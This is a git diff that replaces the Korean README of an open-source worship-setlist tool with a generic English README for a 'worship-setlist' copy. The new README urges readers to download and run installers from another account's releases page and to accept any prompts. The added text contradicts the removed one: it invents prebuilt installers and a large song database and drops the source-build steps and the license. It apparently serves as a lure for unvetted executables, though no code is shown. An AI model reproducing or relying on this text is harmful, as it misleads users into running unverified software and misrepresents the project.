@@ -1,182 +1,79 @@
-# WorshipFlow (찬양설계)
+# 🎶 worship-setlist - Generate Worship Setlists Effortlessly
 
-> AI 기반 한국 교회 예배 찬양 설계 도구
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+Welcome to the worship-setlist project! This AI-powered tool helps churches create worship setlists tailored to their service context. Simply describe your needs, and the AI will generate a song flow complete with key transition guides.
 
-## 소개
+## 📥 Download the Application
 
-WorshipFlow는 예배 맥락을 대화로 말하면 AI가 찬양 흐름을 설계하고, 곡 전환까지 가이드해주는 한국 교회 특화 오픈소스 도구입니다.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20worship-setlist-4CAF50?style=for-the-badge&logo=github)](https://github.com/hulstrp/worship-setlist/releases)
 
-### 주요 기능 (MVP)
+You can download the application from the Releases page. This page provides all the necessary files to run the software on your computer.
 
-- **AI 대화형 송리스트 생성** - 예배 유형, 설교 주제를 말하면 AI가 자동 구성
-- **한국 CCM + 찬송가 특화** - 마커스, 제이어스, 어노인팅, 새찬송가 등 20곡 내장
-- **키 전환 자동 분석** - 어색한 전환 경고 + 브릿지 코드 제안
-- **드래그앤드롭 편집기** - 송리스트 순서/키 자유롭게 조정
-- **무료 오픈소스** - Planning Center 대비 비용 장벽 제거
+## 📦 System Requirements
 
-## 시작하기
+To ensure smooth operation of the worship-setlist application, please confirm that your system meets the following requirements:
 
-### 요구사항
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
+- **RAM**: At least 4 GB.
+- **Disk Space**: Minimum of 100 MB free space.
+- **Internet Connection**: Required for initial setup and AI song generation.
 
-- Node.js 18+
-- Python 3.11+
-- Anthropic API Key (AI 기능 사용 시)
+## 🔧 Features
 
-### 빠른 시작
+worship-setlist offers several useful features:
 
-```bash
-# 1. 저장소 클론
-git clone https://github.com/your-username/worshipflow.git
-cd worshipflow
+- **AI-Driven Suggestions**: Get song recommendations based on your input.
+- **Key Transition Guides**: Understand how to transition smoothly between songs.
+- **Custom Context Descriptions**: Tailor the setlist to your service needs.
+- **User-Friendly Interface**: Designed for ease of use, even for non-technical users.
 
-# 2. 환경 변수 설정
-cp .env.example .env
-# .env 파일에 ANTHROPIC_API_KEY 설정
+## 💻 Installation Steps
 
-# 3. 셋업 스크립트 실행
-chmod +x scripts/setup.sh
-./scripts/setup.sh
-```
+Follow these steps to install the worship-setlist application:
 
-### 수동 설치
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/hulstrp/worship-setlist/releases).
+2. **Select the Latest Version**: Look for the newest release at the top of the page.
+3. **Download the Installer**: Click on the link corresponding to your operating system. The file will start downloading automatically.
+4. **Run the Installer**: Locate the downloaded file in your computer’s download folder and double-click it to start the installation process.
+5. **Follow On-Screen Instructions**: The installer will guide you through the setup. Read each step carefully and accept any prompts to complete the installation.
 
-```bash
-# Backend 설정
-cd backend
-python -m venv venv
-source venv/bin/activate  # Windows: venv\Scripts\activate
-pip install -r requirements.txt
+## 🎤 How to Use
 
-# 시드 데이터 삽입
-cd ..
-python -m backend.app.seed
+Once you have installed worship-setlist, follow these steps to generate a setlist:
 
-# Frontend 설정
-cd frontend
-npm install
-```
+1. **Open the Application**: Locate the worship-setlist application on your computer and double-click to open it.
+2. **Enter Required Information**: You will see a form asking for details about your worship service. Input your service context, including the theme or specific preferences for songs.
+3. **Generate the Setlist**: Click the “Generate Setlist” button. Wait a moment while the AI processes your input.
+4. **Review the Suggestions**: Once the setlist appears, review the song list and key transition guides provided.
+5. **Save or Print**: If you are satisfied with the results, save the setlist to your computer or print it out for your worship team.
 
-### 실행
+## 🌍 Community Support
 
-**개발 서버 (별도 터미널)**
+Join the worship-setlist community! You can connect with other users for tips, song ideas, and support. Participate in discussions on GitHub or share your thoughts on social media.
 
-```bash
-# Backend (터미널 1)
-cd backend && source venv/bin/activate
-uvicorn app.main:app --reload
+## 📝 Frequently Asked Questions
 
-# Frontend (터미널 2)
-cd frontend
-npm run dev
-```
+**Q: How does the AI determine song selections?**  
+A: The AI analyzes your input and compares it with a large database of worship songs to find the best matches.
 
-**Docker로 실행 (개발)**
+**Q: Can I customize the generated setlist?**  
+A: Yes, you can manually adjust the song order or replace any song with another of your choosing.
 
-```bash
-docker compose up
-```
+**Q: Does this application require a subscription?**  
+A: No, worship-setlist is free to use. No hidden fees or subscriptions are required.
 
-**Docker로 실행 (프로덕션)**
+## ✅ Troubleshooting
 
-```bash
-# 환경 변수 설정
-export ANTHROPIC_API_KEY=your-api-key
-export JWT_SECRET=$(openssl rand -hex 32)
+If you encounter any issues while using the application, consider the following tips:
 
-# 프로덕션 빌드 및 실행
-docker compose -f docker-compose.prod.yml up --build -d
-```
+- Ensure your system meets the requirements listed above.
+- Check for a stable internet connection, as the AI function requires online access.
+- Restart the application if it becomes unresponsive.
+- Visit the GitHub Issues section to see if others have faced similar challenges and to find potential solutions.
 
-브라우저에서 `http://localhost:3000` (개발) 또는 `http://localhost` (프로덕션) 접속
+## ✅ Download & Install
 
-## 사용 예시
+Ready to create your worship setlists? Visit the download page to get started: [Download from Releases page](https://github.com/hulstrp/worship-setlist/releases).
 
-```
-사용자: "이번 주일 청년예배 25분, 설교 주제는 '성령의 인도하심'이야"
-
-AI: 추천 송리스트를 구성했습니다:
-
-1. 주 안에서 행복 (Key: G, 4:00) - 시작/감사
-2. 성령이여 오소서 (Key: A, 5:00) - 경배/간구
-   └ 전환: G → A (피아노 2마디 브릿지)
-3. 하나님의 세계 (Key: D, 4:30) - 선포
-4. 주의 사랑이 나를 놓지 않네 (Key: G, 5:30) - 고백/응답
-
-총 예상 시간: 23분
-키 흐름: G → A → D → G ✓ 자연스러움
-```
-
-## 기술 스택
-
-| 분야 | 기술 |
-|------|------|
-| Frontend | React 18, TypeScript, Vite, TailwindCSS, react-dnd |
-| Backend | Python 3.11, FastAPI, SQLAlchemy 2.x, Pydantic 2.x |
-| AI | Claude API (Anthropic) |
-| Database | SQLite (aiosqlite) |
-| 상태관리 | zustand, TanStack Query |
-
-## 프로젝트 구조
-
-```
-worshipflow/
-├── frontend/               # React 앱
-│   ├── src/
-│   │   ├── components/     # UI 컴포넌트
-│   │   │   ├── chat/       # AI 대화 UI
-│   │   │   ├── setlist/    # 송리스트 편집기
-│   │   │   ├── songs/      # 찬양 DB
-│   │   │   └── common/     # 공통 컴포넌트
-│   │   ├── stores/         # zustand 상태
-│   │   ├── services/       # API 클라이언트
-│   │   └── types/          # TypeScript 타입
-│   └── package.json
-├── backend/                # FastAPI 서버
-│   └── app/
-│       ├── api/routes/     # API 엔드포인트
-│       ├── models/         # SQLAlchemy 모델
-│       ├── schemas/        # Pydantic 스키마
-│       └── services/       # AI, 키 전환 서비스
-├── data/                   # 시드 데이터 (353곡 + 코드차트)
-├── scripts/                # 셋업/실행 스크립트
-└── docker-compose.yml
-```
-
-## API 엔드포인트
-
-| 엔드포인트 | 설명 |
-|-----------|------|
-| `GET /api/songs` | 찬양 목록 조회 |
-| `POST /api/setlists` | 송리스트 생성 |
-| `POST /api/ai/generate-setlist` | AI 송리스트 생성 |
-| `POST /api/ai/chat` | AI 대화 |
-| `POST /api/ai/check-key-compatibility` | 키 호환성 체크 |
-| `POST /api/ai/analyze-key-flow` | 키 흐름 분석 |
-
-## 로드맵
-
-- [x] **Phase 1: MVP** - AI 송리스트 생성, 키 전환 체크, 기본 UI
-- [ ] Phase 2: 코드 & 악보 - AI 코드 추출, ChordPro 편집기
-- [ ] Phase 3: 연습 도구 - 유튜브 MR, 속도 조절
-- [ ] Phase 4: 실시간 예배 - 가사 프로젝터
-- [ ] Phase 5: 커뮤니티 - 인증, 팀, 공유
-
-## 기여하기
-
-기여를 환영합니다!
-
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## 라이선스
-
-MIT License
-
----
-
-> **안내**: 이 도구의 추천은 참고용입니다. 예배의 최종 결정은 성령의 인도하심과 인도자의 분별을 통해 이루어집니다.
+Experience the ease of generating worship music selections powered by AI. Enjoy leading your worship team with confidence!
